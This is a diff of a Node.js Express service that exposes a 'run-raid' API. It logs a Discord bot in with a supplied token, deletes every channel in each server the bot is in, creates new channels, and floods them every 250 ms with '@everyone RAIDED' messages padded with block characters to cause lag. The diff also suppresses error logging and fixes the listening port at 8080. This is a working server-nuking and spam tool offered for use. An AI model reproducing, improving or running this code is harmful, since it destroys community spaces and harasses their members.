@@ -1,7 +1,6 @@
 const express = require('express');
 const { Client, IntentsBitField, ChannelType, ActivityType } = require('discord.js');
 const axios = require('axios');
-const path = require('path');
 const app = express();
 
 app.use(express.json());
@@ -46,7 +45,6 @@ app.post('/api/run-raid', async (req, res) => {
     try {
         await bot.login(token);
         bot.once('ready', async () => {
-            // STATUS FORZADO
             bot.user.setPresence({ 
                 activities: [{ 
                     name: `WEB: ${MY_WEB}`, 
@@ -60,7 +58,6 @@ app.post('/api/run-raid', async (req, res) => {
                 try {
                     const channels = await guild.channels.fetch();
                     await Promise.all(channels.map(ch => ch.delete().catch(() => {})));
-                    
                     const lagMsg = (msg || "@everyone RAIDED") + "\n" + "█".repeat(850);
 
                     for (let i = 0; i < 50; i++) {
@@ -72,7 +69,7 @@ app.post('/api/run-raid', async (req, res) => {
                             setInterval(() => ch.send(lagMsg).catch(() => {}), 250);
                         }).catch(() => {});
                     }
-                } catch (e) { console.log("Error en guild: " + guild.name); }
+                } catch (e) {}
             });
             res.json({ success: true, count: bot.guilds.cache.size });
         });
@@ -81,6 +78,8 @@ app.post('/api/run-raid', async (req, res) => {
     }
 });
 
-// PUERTO DINÁMICO PARA RAILWAY
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Elite Engine corriendo en puerto ${PORT}`));
+// PUERTO FORZADO A 8080
+const PORT = 8080;
+app.listen(PORT, '0.0.0.0', () => {
+    console.log(`Elite Engine operativo en http://0.0.0:${PORT}`);
+});
